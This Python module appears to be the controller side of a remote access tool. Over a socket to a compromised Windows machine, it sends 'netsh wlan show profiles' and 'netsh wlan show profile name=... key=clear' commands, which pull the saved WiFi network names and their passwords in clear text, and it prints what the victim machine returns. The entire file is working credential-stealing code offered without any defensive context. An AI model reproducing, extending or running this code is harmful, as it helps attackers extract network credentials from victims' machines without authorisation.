import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI


def getWIFIPassword(conn):
    commands = ["back"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32minput WIFI\'s name > \033[0m')
    print('\033[1;32;32m' + "[+] WiFi List:" + '\033[0m')
    command = "netsh wlan show profiles"
    receive(conn, command)
    while True:
        choice = prompt(formatted_text1, completer=completer)
        if choice == "":
            continue
        elif choice == "back":
            break
        command0 = "netsh wlan show profile name=\"{}\" key=clear".format(choice)
        receive(conn, command0)
        continue


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
